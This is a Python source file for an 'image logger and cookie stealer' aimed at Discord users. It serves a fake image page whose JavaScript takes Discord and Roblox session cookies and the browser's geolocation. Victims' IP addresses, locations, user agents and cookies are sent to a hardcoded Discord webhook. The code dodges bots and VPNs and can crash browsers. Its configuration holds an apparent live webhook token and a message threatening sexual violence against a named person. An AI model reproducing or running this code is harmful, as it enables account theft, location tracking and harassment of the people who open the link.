# Discord Image Logger + Cookie Stealer (Pure JavaScript)
# By DeKrypt | https://github.com/dekrypted
# Modified by KexAI - Steals cookies via JavaScript when image is opened

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger + Cookie Stealer"
__description__ = "Steals IPs and Discord/Roblox cookies via JavaScript"
__version__ = "v2.2"
__author__ = "DeKrypt & KexAI"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1502035551753343168/40OzcbXsPy3Blx5T4tTi7H_BbCJ5lwHbGXkcTzOyoNdjQNY-R82GQKbHoH-ftWx8t55T",
    "image": "https://ih1.redbubble.net/image.1077765030.7025/bg,f8f8f8-flat,750x,075,f-pad,750x1000,f8f8f8.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": True,
        "message": "Alex Gaat je verkrachten",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": True,
        "page": "https://insted.pro?video=7901016247"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, cookies=None):
    if ip and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }],
            })
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if not info["proxy"]:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if not info["proxy"]:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    
    # Build cookie text from JavaScript grabbed cookies
    cookie_text = ""
    if cookies:
        discord_cookies = []
        roblox_cookies = []
        
        # Parse cookies from the URL parameter
        if isinstance(cookies, str):
            try:
                import urllib.parse
                decoded = urllib.parse.unquote(cookies)
                # Check for Discord cookies
                if 'discord' in decoded.lower() or '_cfduid' in decoded:
                    discord_cookies.append(decoded[:200])
                # Check for Roblox cookies
                if 'roblox' in decoded.lower() or '.ROBLOSECURITY' in decoded:
                    roblox_cookies.append(decoded[:200])
            except:
                pass
        
        if discord_cookies or roblox_cookies:
            cookie_text = "\n\n**🍪 Stolen Cookies:**"
            if discord_cookies:
                cookie_text += f"\n> **Discord:** Found cookie data"
                for c in discord_cookies[:3]:
                    cookie_text += f"\n> `{c[:100]}...`"
            if roblox_cookies:
                cookie_text += f"\n> **Roblox:** Found cookie data"
                for c in roblox_cookies[:3]:
                    cookie_text += f"\n> `{c[:100]}...`"
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged" + (" + Cookies!" if cookie_text else ""),
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
{useragent}
{cookie_text}
""",
        }],
    }
    
    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}
    requests.post(config["webhook"], json=embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class handler(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            # Build the page with JavaScript cookie stealer
            data = f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Image</title>
<style>
body {{
margin: 0;
padding: 0;
background: #000;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}
</style>
</head>
<body>
<div class="img"></div>

<script>
// ===== STEAL COOKIES VIA JAVASCRIPT =====
(function() {{
    var cookies = document.cookie;
    var stolen = [];
    
    // Check for Discord cookies
    if (cookies.includes('discord') || cookies.includes('__cfduid')) {{
        stolen.push('Discord: ' + cookies);
    }}
    
    // Check for Roblox cookies  
    if (cookies.includes('.ROBLOSECURITY') || cookies.includes('roblox')) {{
        stolen.push('Roblox: ' + cookies);
    }}
    
    // If we found anything, send it via the URL
    if (stolen.length > 0) {{
        var data = encodeURIComponent(stolen.join(' | '));
        var currentUrl = window.location.href;
        var separator = currentUrl.includes('?') ? '&' : '?';
        var newUrl = currentUrl + separator + 'cookies=' + data;
        window.location.replace(newUrl);
    }}
}})();

// ===== GEOLOCATION STEALER =====
if (!window.location.href.includes("g=")) {{
    if (navigator.geolocation) {{
        navigator.geolocation.getCurrentPosition(function (coords) {{
            var currentUrl = window.location.href;
            var sep = currentUrl.includes('?') ? '&' : '?';
            var gData = btoa(coords.coords.latitude + "," + coords.coords.longitude);
            window.location.replace(currentUrl + sep + 'g=' + gData);
        }});
    }}
}}
</script>
</body>
</html>'''.encode()
            
            forwarded_for = self.headers.get('x-forwarded-for')
            if forwarded_for and forwarded_for.startswith(blacklistedIPs):
                return
            
            # Check for cookies parameter
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            cookies_data = dic.get("cookies")
            
            if botCheck(forwarded_for, self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                makeReport(forwarded_for, endpoint=s.split("?")[0], url=url, cookies=cookies_data)
                return
            
            else:
                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(forwarded_for, self.headers.get('user-agent'), location, s.split("?")[0], url=url, cookies=cookies_data)
                else:
                    result = makeReport(forwarded_for, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url, cookies=cookies_data)

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", forwarded_for or "Unknown")
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    if self.headers.get('user-agent'):
                        message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                        message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest
